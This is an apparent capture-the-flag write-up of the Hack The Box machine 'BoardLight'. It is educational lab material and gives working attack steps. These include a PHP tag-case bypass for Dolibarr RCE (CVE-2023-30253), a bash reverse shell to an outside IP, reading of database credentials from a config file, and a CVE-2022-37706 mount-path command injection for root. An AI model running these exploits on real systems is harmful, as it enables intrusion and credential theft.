---
layout: post
title: BoardLight
difficulty: Easy
description: BoardLight is an easy difficulty Linux machine that features a `Dolibarr` instance vulnerable to CVE-2023-30253.
categories: [writeups]
tags: [HTB, SUID, CVE-2023-30253, CVE-2022-37706]
image:
  path: /assets/boardlight/BoardLight.png
---

## **Summary**

Default credentials were used to access Dolibarr CRM which was vulnerable to [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253) giving us inital access, then exploiting [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) in enlightenment_sys to gain a root shell. 

## **Enumeration**

### **nmap**

Initial port scan revealed two open ports, 80 and 22.

```
$ nmap 10.129.4.177 -sV -Pn -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 17:06 +01
...
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### **http - port 80**

The main domain did not have much, just a static web page.

![](/assets/boardlight/00.png)

We found a domain name down the page and added the fowllowing line to `/etc/hosts`

```
10.129.4.177    board.htb
```

![](/assets/boardlight/10.png)

After having a domain name, we tried finding any virtual hosts, and we got one `crm`

```
$ ffuf -u http://board.htb/ -H 'Host: FUZZ.board.htb' \
-w ~/wordlists/dns/bitquark-subdomains-top100000.txt -fs 15949
...
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 68ms]
```

We updated our `/etc/hosts` to include the recently found virtual host

```
10.129.4.177    crm.board.htb board.htb
```

We browsed to `http://crm.board.htb/` and found that it is running `Dolibarr 17.0.0`

> Dolibarr ERP & CRM is a modular software (we only activate the functions that we want) of business management which adapts to the size of your company (SME, Large companies, Frelancers or associations) [source](https://wiki.dolibarr.org/index.php?title=What_Dolibarr_Does).
{: .prompt-info}

![](/assets/boardlight/01.png)

We were able to login using the default login credentials : `admin:admin`

![](/assets/boardlight/02.png)

This version of Dolibarr was vulnerable to [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253) which is an authenticated remote code execution via an uppercase manipulation in `<?PHP` tag.

> Read more about the exploit in this [blog post](https://www.swascan.com/security-advisory-dolibarr-17-0-0/).
{: .prompt-info}

To exploit it, we went to `Websites`, clicked the `+` button, then filled `Name of the website` and hit `create`.

![](/assets/boardlight/03.png)

Once the website is created, we hit the `+` button next to `Page:` to create a new page, selected the first choice, inserted a title, then clicked on `Create` at the bottom of the page.

![](/assets/boardlight/04.png)

After creating the page, we went to `Edit HTML Source`.

![](/assets/boardlight/05.png)

As a proof on concept we added this line: `<?pHp phpinfo(); ?>`.

![](/assets/boardlight/06.png)

> `<?php` tag is forbidden, to bypass it we used uppercase letters, `<?pHp`.
{: .prompt-info}

After hitting `Save`, we could see that `phpinfo()` has been executed.

![](/assets/boardlight/07.png)

## **Initial access**

To get a reverse shell, all we had to do is setup a listener.

```
nc -lnvp 9000
```

That edit the page again and add the following line.

```php
<?pHp system("bash -c 'bash -i >& /dev/tcp/10.10.14.223/9000 0>&1'"); ?>
```

After getting a connection back, we were able to extract the database credentials.

```
$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
...
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
...
```

And as a result extract user credentials from the database, even though it was of no use to us.
```
$ mysql -u 'dolibarrowner' -p'serverfun2$2023!!' -D dolibarr -e 'select login,pass_crypted from llx_user;'
+----------+--------------------------------------------------------------+
| login    | pass_crypted                                                 |
+----------+--------------------------------------------------------------+
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+----------+--------------------------------------------------------------+
```

We used the databse passowrd (`serverfun2$2023!!`) to login as larissa.
```
$ su larissa
Password: serverfun2$2023!!
```

## **Privilege escalation**

We found a binary (`enlightenment_sys`) with SUID bit set, wich means it will be run with the privilege of the owner which is root.

```
larissa@boardlight:~$ 2>/dev/null find / -type f -perm -u=s
...
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
...
```

> [enlightenment](https://www.enlightenment.org/about) is a window manager for linux.
>
> `enlightenment_sys` is a component of the Enlightenment window manager for Linux, which is responsible for managing graphical user interfaces. It has a known security vulnerability ([CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)) that allows local users to gain elevated privileges due to improper handling of certain pathnames.
{: .prompt-info}

To get a root shell we executed the following commands.

```
$ mkdir -p /tmp/net
$ mkdir -p "/dev/../tmp/;/tmp/exploit"
$ echo "/bin/sh" > /tmp/exploit
$ chmod a+x /tmp/exploit
$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount \
-o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
"/dev/../tmp/;/tmp/exploit" /tmp///net
```
![](/assets/boardlight/09.png)
